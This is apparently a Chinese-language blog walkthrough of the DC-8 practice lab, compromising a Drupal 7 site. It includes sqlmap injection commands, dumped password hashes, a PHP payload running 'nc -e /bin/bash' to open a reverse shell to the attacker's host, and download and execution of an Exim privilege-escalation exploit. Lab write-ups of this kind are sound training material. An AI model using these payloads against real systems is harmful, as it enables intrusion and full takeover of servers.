---
title: DC8
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-21T16:07:46+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
==>
192.168.121.152
```

打开页面，该站点同样是由Drupal搭建的，与前两次不同的是，这次页面时一个报警信息，大致内容如下

```
在接下来的几周中，由于我们需要解决一些未解决的问题，本网站可能会受到干扰
```

说明该网站存在一些漏洞，先扫描端口

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\nmap.png)

这次能出来的目录会多一些，查看一下都是些安装信息，扫描目录，仍然存在user目录，访问也同样只有登录口以及修改密码的接口，测试发现这里仍然存在admin用户，再次尝试Druupwn工具

![drupwn](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\drupwn.png)

能够看到版本为7.0，但是没有我们所需要的漏洞，换了一个更好![droopescan](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\droopescan.png)用的工具

能够测出来更详细的版本和目录信息，上msf测试两个比较可能的漏洞，都是利用失败了，接下来就只有手动测试，由于有留言板，所以尝试一下xss,看能不能拿到admin的cookie,打了半天也没有cookie的回显，admin查看留言的时间不确定，看看还有哪些地方可以利用，既然有登录框，很显然可以尝试sql注入，7.67也确实存在sql注入的cve，不过需要用户名和密码才能执行成功，先尝试一下登陆界面，没能注出来，看看哪里还有注入点

![nid](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\nid.jpg)

发现nid存在页面的调用，看看这里有没有注入点，后面添加单引号，发现报错了，存在注入点，那就用sqlmap再跑一下nid

```
sqlmap -u 192.168.121.152/?nid=1 --random-agent --risk=3  --level=5 --dbs --keep-alive
```

成功得到数据库名

```
available databases [2]:
[*] d7db
[*] information_schema
```

接下来跑表，列和数据

```
table
Database: d7db
[88 tables]
+-----------------------------+
| filter                      |
| system                      |
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_views                 |
| cache_views_data            |
| ckeditor_input_format       |
| ckeditor_settings           |
| ctools_css_cache            |
| ctools_object_cache         |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| site_messages_table         |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| views_display               |
| views_view                  |
| watchdog                    |
| webform                     |
| webform_component           |
| webform_conditional         |
| webform_conditional_actions |
| webform_conditional_rules   |
| webform_emails              |
| webform_last_download       |
| webform_roles               |
| webform_submissions         |
| webform_submitted_data      |
+-----------------------------+
```

优先查询users

```
dc8blah@dc8blah.org | dcau-user@outlook.com | admin   |  $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
john@blahsdfsfd.org | john@blahsdfsfd.org   | john    |  $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
```

能查询到admin以及john用户，但是二者的密码都经过了加密，尝试暴力破解，根据第二个用户名的提示，使用john进行破解

![john](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\john.png)

得到密码turtle,admin的密码是出不来的，登录john的账号，利用awvs进行深度扫描

![awvs](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\awvs.png)

扫描出来高危漏洞存在，选择了一个任意代码执行的漏洞进行尝试

CVE-2020-13671/CVE-2020-36193/CVE-2020-28948,通过添加一个uploadfiles模块，我开始对这三个CVE进行测试，但是双扩展名似乎并不起效，我在读取文件时，同样是以txt文本的形式进行解析，前前后后测试了3个小时左右，能得到的结果为

```
php ==>增加后缀名txt，不允许截断
phar,phtml ==>同php文件
inc,phps  ==>解析但不允许访问
其余扩展名均不解析
```

不过在测试中能看到一个formsetting处能够执行phpcode，可以尝试利用该点进行shell反弹，该页面的逻辑是通过提交表单成功后执行php代码

```
<?php 
system('nc -e /bin/bash 192.168.121.135 4444');
?>
```

提交表单，成功反弹shell

![shell](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\shell.png)

搜寻信息无果后尝试直接提权

```
find / -perm -u=s -type f 2>/dev/null
```

发现该用户能够执行sudo命令，但是需要密码，查看www-data对/etc/passwd的文件权限

查看www-data能够执行写入操作的所有文件

```
find / -writable -type d 2>/dev/null
```

![write](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\write.jpg)

在网站目录下找到了用户密码的加密脚本，password-hash.sh,但是当前用户没有执行权限，使用sudo被要求密码

```
find / -perm -o x -type d 2>/dev/null 
```

查找当前用户可执行的脚本，显示结果为无

![公钥](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\公钥.png)

能够查询到root用户的公钥

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpwI3lfF3nPEto2eJ06rDsWNhlqAS6A6jr8pDpZ0lMZ5WiCoLaeEbaAGckRPD7SqXwA02ovM+0YytQ1McFOaGJR5/WgnFK6B652eJdsBYSEPkJL08fb2+4d8Gd+upaC4qwMTXFTkowveFkrJNXLOknyYo3vNeK2LunqMemh8/TuWfo9g6Om0zTwc+LpepFwPqB+HhvkKKPC14tqIPgbMgQqky7bYLyhKvztrkCMd11oQeM4Ie2f8ZPpAkDCgCAb700ALOkPda28hq255dYm2gZWADh6uqpMoXKMBz9/N1CAS7HdGTbbgi0dmtWp8JLIzNW22es2Jl/zm+mFv9IXON root@dc-8
```

尝试远程免密登录无果，重新回到能以root权限执行的脚本上来

![sss](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\sss.png)

查询到sudo的版本为1.8.19p1存在CVE2019-14287，根据操作通过-1来绕过

```
sudo -u#-1 id
```

仍然要求我们输入密码，漏洞利用失败

搜寻exim的漏洞，将exp拷贝到桌面上

```
cp /usr/share/exploitdb/exploits/linux/local/46996.sh Desktop/dc8.sh
sed -i 's/\r$//' dc8.sh   //修正脚本
python -m http.server 8000
wget http://192.168.121.135:8000/dc8.sh
chmod +x dc8.sh //赋予执行权限
./dc8.sh -m netcat 
==>得到root权限
```

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC8图库\flag.png)

查询flag即可

## 总结：

难度主要在登录进入后台后获取反向shell,主要是几条CVE都没有利用成功，不知道是修复了还是怎么，以及利用phpcode反弹shell时，脚本的问题，能够用在其他机器上的脚本现在反而不能用了，也提示我需要去尝试多个反弹shell的命令，而不是反弹一个不成功就结束了，以及提权部分，并不是在线工具搜索不到的suid就不进行尝试，一些工具的版本漏洞同样可以利用
